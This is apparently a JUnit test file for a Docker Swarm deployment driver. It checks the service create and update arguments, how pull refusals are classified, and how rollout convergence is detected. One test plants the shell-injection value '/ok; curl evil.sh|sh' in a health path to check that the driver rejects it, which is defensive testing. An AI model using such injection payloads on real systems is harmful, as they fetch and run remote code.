package eu.wohlben.qits.platform.deployments.swarmhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.platform.deployments.deployments.control.DeploymentDriver;
import eu.wohlben.qits.platform.deployments.deployments.control.HealthGate;
import eu.wohlben.qits.platform.deployments.deployments.control.PdProcess;
import eu.wohlben.qits.platform.deployments.deployments.control.ServiceExtras;
import eu.wohlben.qits.platform.deployments.environments.entity.PdDeploymentTarget;
import eu.wohlben.qits.platform.deployments.environments.error.BadRequestException;
import io.smallrye.config.PropertiesConfigSource;
import io.smallrye.config.SmallRyeConfigBuilder;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Deque;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker service} argv as assembled, and the verdicts read back out of it — plain JUnit
 * over a scripted process seam: the argv IS the contract with swarm, and asserting it needs no
 * swarm.
 *
 * <p><b>It is the whole of what a booted application no longer covers.</b> While a hand-rolled
 * replace lived above this seam, the {@code @QuarkusTest} flow tests drove that choreography for
 * real against a faked CLI. There is no choreography left — the whole membership is declared at
 * create time, the update policy IS the cutover, and {@code UpdateStatus} already says whether the
 * rollback happened — so what a deployment does to a daemon is settled here, one argv at a time.
 */
class SwarmDeploymentDriverTest {

  private static final String IMAGE = "qits-platform-artifacts:8080/qits/qits-gateway:abc1234";

  /** When the scripted deployment issued its update — the qits-docs incident's own instant. */
  private static final Instant ISSUED = Instant.parse("2026-08-13T10:21:12.698Z");

  private static final DateTimeFormatter GO_TIME =
      DateTimeFormatter.ofPattern("uuuu-MM-dd HH:mm:ss.SSSSSSSSS");

  private ScriptedCli cli;

  /** A StartedAt as {@code service inspect --format} prints it: Go's own {@code time.Time}. */
  private static String stamp(Instant instant) {
    return GO_TIME.format(instant.atOffset(ZoneOffset.UTC)) + " +0000 UTC";
  }

  /**
   * A driver that has just updated {@code dev-qits-gateway} at {@link #ISSUED} — which is what
   * makes the difference between this deployment's UpdateStatus and the previous one's readable.
   */
  private SwarmDeploymentDriver driverThatIssuedAnUpdate() {
    SwarmDeploymentDriver driver = driver();
    driver.clock = Clock.fixed(ISSUED, ZoneOffset.UTC);
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, driver.apply(spec()).outcome());
    return driver;
  }

  private SwarmDeploymentDriver driver() {
    return driver(Map.of());
  }

  private SwarmDeploymentDriver driver(Map<String, String> properties) {
    SwarmDeploymentDriver driver = new SwarmDeploymentDriver();
    driver.runtime = "docker";
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 10;
    driver.updateMonitorSeconds = 30;
    driver.flatNetwork = "qits-net";
    driver.outputMaxChars = 65536;
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(new PropertiesConfigSource(properties, "test", 100))
            .build();
    cli = new ScriptedCli();
    driver.scriptCli(cli);
    return driver;
  }

  /**
   * An ordinary tier application, asked for the docker-shaped membership the state machine computes
   * without knowing who runs it: its own network first, then the legacy one and its bundle.
   */
  private DeploymentDriver.ServiceSpec spec() {
    return spec(PdDeploymentTarget.ENVIRONMENT, DeploymentDriver.UpdateOrder.START_FIRST, List.of());
  }

  private DeploymentDriver.ServiceSpec spec(
      PdDeploymentTarget target,
      DeploymentDriver.UpdateOrder order,
      List<DeploymentDriver.ResourceBinding> resources) {
    return spec(target, order, DeploymentDriver.PublishMode.HOST, resources);
  }

  private DeploymentDriver.ServiceSpec spec(
      PdDeploymentTarget target,
      DeploymentDriver.UpdateOrder order,
      DeploymentDriver.PublishMode publishMode,
      List<DeploymentDriver.ResourceBinding> resources) {
    boolean platform = target == PdDeploymentTarget.PLATFORM;
    return new DeploymentDriver.ServiceSpec(
        platform ? null : "env-id",
        platform ? null : "dev",
        "app-id",
        "qits-gateway",
        "dep-id",
        "abc1234",
        platform ? "qits-pd-qits-gateway-dep" : "qits-pd-dev-qits-gateway-dep",
        platform ? "qits-gateway" : "dev-qits-gateway",
        platform
            ? List.of("qits-platform", "qits-net")
            : List.of("qits-env-dev-qits-gateway", "qits-net", "qits-env-dev"),
        IMAGE,
        "/q/health/ready",
        null,
        target,
        !platform,
        order,
        publishMode,
        resources);
  }

  @Test
  void theServiceIsNamedAfterTheWireAliasBecauseTheNameIsTheAddress() {
    // container_name does not exist under swarm, so the service name IS what peers resolve — and
    // therefore what the deployment row records and every later question asks about.
    assertEquals("dev-qits-gateway", driver().nameOf(spec()));
    assertEquals(
        "qits-gateway",
        driver()
            .nameOf(
                spec(
                    PdDeploymentTarget.PLATFORM,
                    DeploymentDriver.UpdateOrder.START_FIRST,
                    List.of())),
        "one instance for the whole platform keeps the bare name");
  }

  @Test
  void aFreshServiceDeclaresItsWholeMembershipTheHealthGateAndTheUpdatePolicy() {
    List<String> argv = driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertEquals(List.of("docker", "service", "create", "--detach"), argv.subList(0, 4));
    assertTrue(argv.containsAll(List.of("--name", "dev-qits-gateway")));
    assertTrue(argv.containsAll(List.of("--replicas", "1")));
    // The seed's qits/* tags exist on this host and in no registry, so nothing may try to resolve
    // them to a digest.
    assertTrue(argv.contains("--no-resolve-image"));
    assertTrue(argv.containsAll(List.of("--network", "qits-net")));
    assertTrue(argv.containsAll(List.of("--restart-condition", "any")));
    // The gate is docker's own healthcheck, enforced inside the container.
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    assertTrue(argv.containsAll(List.of("--health-start-period", "10s")));
    // ...and the cutover is three flags rather than four hundred lines.
    assertTrue(argv.containsAll(List.of("--update-order", "start-first")));
    assertTrue(argv.containsAll(List.of("--update-monitor", "30s")));
    assertTrue(argv.containsAll(List.of("--update-failure-action", "rollback")));
    // The bookkeeping labels, on the service AND on its task container: everything that reads them
    // reads them by name and does not care what created them.
    assertTrue(argv.contains("qits.platform.deployments.environment=env-id"));
    assertTrue(argv.contains("qits.platform.deployments.application=app-id"));
    assertTrue(argv.contains("qits.platform.deployments.deployment=dep-id"));
    assertTrue(argv.contains("qits.platform.deployments.target=environment"));
    assertTrue(argv.contains("qits.platform.deployments.app-name=qits-gateway"));
    assertEquals(
        argv.stream().filter("--label"::equals).count(),
        argv.stream().filter("--container-label"::equals).count(),
        "every service label is a task label too: " + argv);
    assertTrue(argv.contains("QITS_ENVIRONMENT=dev"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    assertTrue(
        argv.contains(
            "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                + ",deployment.environment.name=dev"
                + ",service.instance.id=dev-qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals(IMAGE, argv.get(argv.size() - 1));
  }

  @Test
  void theTopologyCollapsesToTheFlatOverlayAndTheDeclaredSetIsWhatTheServiceGets() {
    // §4.1: every `service update --network-add` recreates the task, so a per-application network
    // per deployment would make one deployment a restart storm. What survives is the flat
    // attachable overlay — and qits-platform for the plane that needs it.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(1, "no such service"));

    driver.apply(spec());

    List<String> create = cli.matching("service create");
    assertTrue(create.containsAll(List.of("--network", "qits-net")), create.toString());
    assertTrue(
        create.stream().noneMatch(argument -> argument.startsWith("qits-env-")),
        "no per-application or bundle network is declared: " + create);

    SwarmDeploymentDriver platform = driver();
    cli.script("--format {{.ID}}", result(1, "no such service"));
    platform.apply(
        spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()));
    List<String> platformCreate = cli.matching("service create");
    assertTrue(platformCreate.contains("qits-net"), platformCreate.toString());
    assertTrue(platformCreate.contains("qits-platform"), platformCreate.toString());
  }

  /** Every {@code --network} and the element behind it, in order — the membership as declared. */
  private static List<String> networkArguments(List<String> argv) {
    List<String> arguments = new ArrayList<>();
    for (int index = 0; index < argv.size() - 1; index++) {
      if ("--network".equals(argv.get(index))) {
        arguments.add(argv.get(index));
        arguments.add(argv.get(index + 1));
      }
    }
    return arguments;
  }

  @Test
  void aDeclaredAliasRidesTheSharedNetworksAttachmentAndNoOthers() {
    // The edge carries the platform's vhost names, and docker's embedded DNS cannot synthesize a
    // *.localhost — so those names resolve only as aliases of the edge's attachment to the network
    // every service joins. qits-platform is the plane's own network and keeps the short form.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                    "registry.dev.localhost",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[1]",
                    "mirror.dev.localhost"));

    List<String> argv =
        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-platform"));

    assertTrue(
        argv.containsAll(
            List.of(
                "--network", "name=qits-net,alias=registry.dev.localhost,alias=mirror.dev.localhost")),
        argv.toString());
    assertTrue(argv.containsAll(List.of("--network", "qits-platform")), argv.toString());
    assertEquals(2, argv.stream().filter("--network"::equals).count(), argv.toString());
    assertEquals(IMAGE, argv.get(argv.size() - 1));
  }

  @Test
  void aServiceWithNoAliasesGetsTheShortFormItAlwaysGot() {
    // The pin: `--network <net>` and `--network name=<net>` mean the same thing to swarm, and only
    // one of them is what every service on this platform was created with.
    List<String> argv =
        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-platform"));

    assertEquals(
        List.of("--network", "qits-net", "--network", "qits-platform"),
        networkArguments(argv),
        argv.toString());
    assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("name=")), argv.toString());
  }

  @Test
  void aliasesWithNoSharedNetworkToHoldThemRefuseTheDeployment() {
    // The publish-with-an-ip stance: a name asked for and quietly not registered is a peer
    // resolving nothing, hours later and somewhere else.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    driver.flatNetwork = "";

    assertThrows(
        ServiceExtras.Refused.class,
        () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-platform")));
  }

  @Test
  void anUpdateStatesNoNetworkSoItStatesNoAliasEither() {
    // Swarm has no add-an-alias: an attachment is restated whole, and --network-add of a network
    // the service is already on is an error. Changing an alias is network-rm/network-add by hand,
    // or a service rm and a redeploy — never a deployment.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("--network")), argv.toString());
    assertTrue(argv.stream().noneMatch(argument -> argument.contains("alias=")), argv.toString());
    assertTrue(
        argv.stream().noneMatch(argument -> argument.contains("registry.dev.localhost")),
        argv.toString());
  }

  @Test
  void aServiceThatExistsIsUpdatedInPlaceAndKeepsWhatItWasCreatedWith() {
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(0, "svc123"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service create").isEmpty(), "no second service beside the first");
    List<String> update = cli.matching("service update");
    assertEquals(List.of("docker", "service", "update", "--detach"), update.subList(0, 4));
    assertTrue(update.containsAll(List.of("--image", IMAGE)));
    assertEquals("dev-qits-gateway", update.get(update.size() - 1), "the service is the last token");
    // Mounts, networks and published ports are the create's and stay the create's: an update states
    // what changes, and re-stating a mount would append a second copy of it.
    assertTrue(update.stream().noneMatch(argument -> argument.equals("--network")), update.toString());
    assertTrue(update.stream().noneMatch(argument -> argument.startsWith("--mount")), update.toString());
    // What a deployment does change: the image, the identity it stamps, and the policy it runs under.
    assertTrue(update.containsAll(List.of("--label-add", "qits.platform.deployments.deployment=dep-id")));
    assertTrue(update.contains("--container-label-add"));
    assertTrue(update.containsAll(List.of("--update-order", "start-first")));
    assertTrue(update.containsAll(List.of("--update-failure-action", "rollback")));
    assertTrue(update.contains("--env-add"));
  }

  @Test
  void theUpdateOrderIsTheRepositorysAndStopFirstIsTheOptOut() {
    List<String> argv =
        driver()
            .buildUpdateArgv(
                spec(
                    PdDeploymentTarget.ENVIRONMENT,
                    DeploymentDriver.UpdateOrder.STOP_FIRST,
                    List.of()),
                "dev-qits-gateway");

    assertTrue(argv.containsAll(List.of("--update-order", "stop-first")), argv.toString());
    // It still rolls back — it just has a gap in service, which is what those applications have
    // today anyway.
    assertTrue(argv.containsAll(List.of("--update-failure-action", "rollback")));
  }

  @Test
  void nothingCarriesARegistryCredentialUntilTheKeySaysSo() {
    // The shipped state, and it is stated rather than assumed: reads on the platform's registry are
    // anonymous today, so both argvs are what they were byte for byte.
    assertFalse(
        driver()
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .contains("--with-registry-auth"));
    assertFalse(
        driver().buildUpdateArgv(spec(), "dev-qits-gateway").contains("--with-registry-auth"));
  }

  @Test
  void theCredentialRidesBothArgvsSoTheAGENTSPullIsAuthenticatedToo() {
    // The flag serialises the CLI's credential into the service spec, which is what the swarm agent
    // pulls with. The warm-up `docker pull` is this process's own and proves nothing about the node
    // — so a create that carried it and an update that did not would authenticate the first
    // deployment of a service and refuse every one after it.
    SwarmDeploymentDriver driver = driver();
    driver.registryAuth = true;

    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .contains("--with-registry-auth"));
    assertTrue(driver.buildUpdateArgv(spec(), "dev-qits-gateway").contains("--with-registry-auth"));
    // It sits beside --no-resolve-image rather than instead of it: one says do not turn the tag
    // into a digest, the other says hand the agents a credential for the pull they do later.
    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .contains("--no-resolve-image"));
  }

  @Test
  void aRefusedPullIsItsOwnOutcomeInEveryWordingDockerHasForIt() {
    // Each of these is a real docker phrasing, and the first is the one that used to be read as a
    // missing image — it carries "repository does not exist" inside it, which is why the refusal
    // list is asked first.
    List<String> refusals =
        List.of(
            "Error response from daemon: pull access denied for qits/qits-gateway, repository does"
                + " not exist or may require 'docker login'",
            "denied: requested access to the resource is denied: authorization failed",
            "no basic auth credentials",
            "unauthorized: authentication required");

    for (String refusal : refusals) {
      SwarmDeploymentDriver driver = driver();
      cli.script("pull", result(1, refusal));

      DeploymentDriver.PullResult pulled = driver.pull(IMAGE);

      assertEquals(DeploymentDriver.PullOutcome.AUTH_REFUSED, pulled.outcome(), refusal);
      assertTrue(pulled.detail().contains(refusal), pulled.detail());
    }
  }

  @Test
  void anAbsentTagIsStillAMissingImage() {
    // The narrowed meaning: the registry answered and has no such thing, which indicts the
    // repository's own publishing step and nothing about a credential.
    for (String absence : List.of("manifest unknown", "Error: image not found", "name unknown")) {
      SwarmDeploymentDriver driver = driver();
      cli.script("pull", result(1, absence));

      assertEquals(
          DeploymentDriver.PullOutcome.IMAGE_MISSING, driver.pull(IMAGE).outcome(), absence);
    }
  }

  @Test
  void aFailureNeitherListRecognisesIsStillAnError() {
    // The narrowness rule, unchanged by the second list: a daemon that is down must never read as
    // "nothing published this build" and must never read as "check the credential" either.
    SwarmDeploymentDriver driver = driver();
    cli.script("pull", result(1, "Cannot connect to the Docker daemon at unix:///var/run/docker.sock"));

    assertEquals(DeploymentDriver.PullOutcome.ERROR, driver.pull(IMAGE).outcome());
  }

  @Test
  void everyExtraIsRenderedInSwarmsOwnSpelling() {
    // Nothing is translated out of a docker argv any more: config states mounts, publishes, groups
    // and environment, and this is what they are called on a service create.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[1]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[2]",
                    "volume:qits-docs:/docs:ro",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.groups[0]", "992",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.FOO", "bar",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "8081:8080",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[1]", "5353:8053/udp"));

    List<String> argv = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertTrue(argv.containsAll(List.of("--mount", "type=volume,source=qits-data,target=/data")));
    assertTrue(
        argv.containsAll(
            List.of("--mount", "type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock")),
        argv.toString());
    assertTrue(
        argv.containsAll(List.of("--mount", "type=volume,source=qits-docs,target=/docs,readonly")));
    assertTrue(argv.containsAll(List.of("--group", "992")));
    assertTrue(argv.containsAll(List.of("--env", "FOO=bar")));
    // mode=host rather than the ingress default: it is per node, like a plain `docker run`, and
    // this platform is one node.
    assertTrue(argv.containsAll(List.of("--publish", "published=8081,target=8080,mode=host")));
    assertTrue(
        argv.containsAll(List.of("--publish", "published=5353,target=8053,protocol=udp,mode=host")),
        argv.toString());
    assertEquals(IMAGE, argv.get(argv.size() - 1));
  }

  @Test
  void anIngressServiceHandsItsPortToTheRoutingMeshAndKeepsStartFirst() {
    // The mode is the repository's publish_mode, and it is the whole of what changes: the port is
    // held by the mesh rather than by the task, so the successor can start while the predecessor
    // is still serving — which is why the update order stays start-first beside it.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "8080:8080",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[1]", "5353:8053/udp"));

    List<String> argv =
        driver.buildCreateArgv(
            spec(
                PdDeploymentTarget.ENVIRONMENT,
                DeploymentDriver.UpdateOrder.START_FIRST,
                DeploymentDriver.PublishMode.INGRESS,
                List.of()),
            "dev-qits-gateway",
            List.of("qits-net"));

    assertTrue(
        argv.containsAll(List.of("--publish", "published=8080,target=8080,mode=ingress")),
        argv.toString());
    assertTrue(
        argv.containsAll(
            List.of("--publish", "published=5353,target=8053,protocol=udp,mode=ingress")),
        argv.toString());
    assertTrue(argv.containsAll(List.of("--update-order", "start-first")), argv.toString());
  }

  @Test
  void anIngressServiceThatDeclaresStopFirstStillGetsStopFirst() {
    // The two keys are independent statements and nothing derives one from the other: a repository
    // that has a reason to say stop-first is not overruled by its publish mode.
    List<String> argv =
        driver()
            .buildUpdateArgv(
                spec(
                    PdDeploymentTarget.ENVIRONMENT,
                    DeploymentDriver.UpdateOrder.STOP_FIRST,
                    DeploymentDriver.PublishMode.INGRESS,
                    List.of()),
                "dev-qits-gateway");

    assertTrue(argv.containsAll(List.of("--update-order", "stop-first")), argv.toString());
  }

  @Test
  void anIngressPublishStillCannotNameAnAddress() {
    // Swarm's publish has no ip field in EITHER mode, so the refusal is the mode-independent one:
    // ingress binds 0.0.0.0 exactly as host does, and the mode changes who holds the port rather
    // than who can reach it.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]",
                "127.0.0.1:9000:9000"));

    ServiceExtras.Refused refused =
        assertThrows(
            ServiceExtras.Refused.class,
            () ->
                driver.buildCreateArgv(
                    spec(
                        PdDeploymentTarget.ENVIRONMENT,
                        DeploymentDriver.UpdateOrder.START_FIRST,
                        DeploymentDriver.PublishMode.INGRESS,
                        List.of()),
                    "dev-qits-gateway",
                    List.of("qits-net")));
    assertTrue(refused.getMessage().contains("127.0.0.1"), refused.getMessage());
  }

  @Test
  void aPublishThatDemandsAnIpIsRefusedRatherThanWidened() {
    // Swarm's publish syntax has no ip field in either mode — measured: a host-mode publish listens
    // on 0.0.0.0. A port that was deliberately on loopback must not quietly become a port on every
    // interface, so the deployment is refused and says which port and which address.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]",
                "127.0.0.1:9000:9000"));

    ServiceExtras.Refused refused =
        assertThrows(
            ServiceExtras.Refused.class,
            () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net")));
    assertTrue(refused.getMessage().contains("127.0.0.1"), refused.getMessage());

    // Nothing was applied: the argv is built before the command runs, so the deployment is a
    // refusal with the detail on the row and a platform that did not change.
    cli.script("--format {{.ID}}", result(1, "no such service"));
    DeploymentDriver.ApplyResult applied = driver.apply(spec());
    assertEquals(DeploymentDriver.ApplyOutcome.REFUSED, applied.outcome());
    assertTrue(applied.detail().contains("9000"), applied.detail());
    assertTrue(cli.matching("service create").isEmpty(), "nothing was created");
  }

  @Test
  void everyInterfaceIsSaidOutLoudRatherThanImplied() {
    // The registry's publish is dialled by the HOST's docker daemon, so it cannot be private to the
    // overlay. 0.0.0.0 is how the generated config says that on purpose — and it is the one ip
    // swarm can honour, because it is the one it does anyway.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "0.0.0.0:8081:8080"));

    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .containsAll(List.of("--publish", "published=8081,target=8080,mode=host")));
  }

  @Test
  void anUnreadableExtraRefusesTheDeployment() {
    // Config is typed now, so an unknown key is a bug rather than a word this driver does not
    // speak. It used to be a WARN and a dropped flag — a container that boots without its volume.
    SwarmDeploymentDriver driver =
        driver(Map.of(DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.add-hosts[0]", "a:1.2.3.4"));

    assertThrows(
        ServiceExtras.Refused.class,
        () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net")));
  }

  @Test
  void extrasOfAnotherApplicationDoNotLeakIn() {
    // The absence is the assertion that matters: only the deployed application's own keys reach
    // its argv, so one application's socket bind cannot ride along on a sibling's deployment —
    // including a sibling whose name merely starts with this one's.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-workspaces.mounts[0]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway-daemon.mounts[0]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertEquals(IMAGE, argv.get(argv.size() - 1));
    assertTrue(argv.stream().noneMatch(argument -> argument.contains("docker.sock")));
  }

  @Test
  void theEnvironmentIsRestatedOnAnUpdateBecauseAnAddressCanChange() {
    // A service update keeps the shape it is not asked to change — mounts and ports stay — but a
    // variable is a value rather than a shape: config naming a new address is what the next
    // deployment is supposed to carry.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL",
                    "http://dev-qits-events:8080",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertTrue(
        argv.containsAll(List.of("--env-add", "QITS_EVENTS_URL=http://dev-qits-events:8080")),
        argv.toString());
    assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("--mount")));
  }

  @Test
  void aProvisionedResourceArrivesAsTheGenericTriple() {
    List<String> argv =
        driver()
            .buildCreateArgv(
                spec(
                    PdDeploymentTarget.ENVIRONMENT,
                    DeploymentDriver.UpdateOrder.START_FIRST,
                    List.of(
                        new DeploymentDriver.ResourceBinding(
                            "read-replica",
                            "jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway",
                            "qits_gateway",
                            "0123456789abcdef"))),
                "dev-qits-gateway",
                List.of("qits-net"));

    assertTrue(
        argv.contains(
            "QITS_RESOURCE_READ_REPLICA_URL=jdbc:postgresql://dev-qits-oci-postgresql:5432/qits_gateway"),
        argv.toString());
    assertTrue(argv.contains("QITS_RESOURCE_READ_REPLICA_USERNAME=qits_gateway"));
    assertTrue(argv.contains("QITS_RESOURCE_READ_REPLICA_PASSWORD=0123456789abcdef"));
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // The belt at the argv, and the reason is that this is the one value interpolated
    // into a string a shell inside the container runs.
    DeploymentDriver.ServiceSpec hostile =
        new DeploymentDriver.ServiceSpec(
            "env-id",
            "dev",
            "app-id",
            "qits-gateway",
            "dep-id",
            "abc1234",
            "qits-pd-dev-qits-gateway-dep",
            "dev-qits-gateway",
            List.of("qits-net"),
            IMAGE,
            "/ok; curl evil.sh|sh",
            null,
            PdDeploymentTarget.ENVIRONMENT,
            true,
            DeploymentDriver.UpdateOrder.START_FIRST,
            DeploymentDriver.PublishMode.HOST,
            List.of());

    SwarmDeploymentDriver driver = driver();
    assertThrows(
        BadRequestException.class,
        () -> driver.buildCreateArgv(hostile, "dev-qits-gateway", List.of("qits-net")));
  }

  @Test
  void aCompletedUpdateIsAConvergedDeployment() {
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "updating|" + stamp(ISSUED) + "|update in progress"),
        result(0, "completed|" + stamp(ISSUED) + "|"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.CONVERGED, converged.outcome());
    // Nothing for the caller to reap: a replace is in place, so the predecessor IS this service.
    assertEquals(List.of(), converged.retired());
  }

  @Test
  void aRollbackIsAFailedDeploymentWithSwarmsOwnMessageOnIt() {
    // The measured failure path: under start-first the predecessor kept serving for the whole
    // window while the unhealthy successor sat in Starting, and swarm reverted the spec by itself.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "rollback_completed|" + stamp(ISSUED) + "|rollback completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.ROLLED_BACK, converged.outcome());
    assertTrue(converged.detail().contains("rollback completed"), converged.detail());
    assertFalse(converged.converged());
  }

  @Test
  void aPausedUpdateIsAFailureRatherThanSomethingToKeepWaitingOn() {
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "paused|" + stamp(ISSUED) + "|update paused due to failure"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("update paused"), converged.detail());
  }

  @Test
  void thePreviousUpdatesVerdictIsNotThisDeploymentsVerdict() {
    // The live defect, in one test. qits-docs had a `completed` from an earlier cutover, and
    // `service update --detach` returns before the daemon has replaced the field — so the first
    // poll answered "completed" 43ms after the update was issued and the deployer wrote the row
    // ACTIVE while swarm was still rolling the successor back. StartedAt is what tells the two
    // updates apart.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "completed|" + stamp(ISSUED.minusSeconds(3600)) + "|update completed"),
        result(0, "rollback_completed|" + stamp(ISSUED.plusMillis(120)) + "|rollback completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.ROLLED_BACK, converged.outcome());
    assertTrue(converged.detail().contains("rollback completed"), converged.detail());
  }

  @Test
  void aVerdictStampedAfterTheUpdateWasIssuedIsThisDeploymentsOwn() {
    // The other half: waiting through a stale status must still end in the real answer, or the fix
    // would have turned every second deployment into a timeout.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus",
        result(0, "completed|" + stamp(ISSUED.minusSeconds(3600)) + "|update completed"),
        result(0, "completed|" + stamp(ISSUED.plusMillis(120)) + "|update completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.CONVERGED, converged.outcome());
  }

  @Test
  void anUpdateWhoseStatusNeverArrivesFailsAtTheDeadlineRatherThanReadingTheTasks() {
    // Swarm clears UpdateStatus while it takes the update in, and the task check is no answer
    // there: under start-first the PREDECESSOR is still Running, so falling through to it would
    // declare the deployment being replaced a success. The deadline is what ends this.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(".UpdateStatus", result(0, "||"));
    cli.script("service ps", result(0, "Running 4 minutes ago"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO);

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("not started yet"), converged.detail());
  }

  @Test
  void theSkewToleranceIsFiveSecondsAndItIsAnEdgeRatherThanAFeeling() {
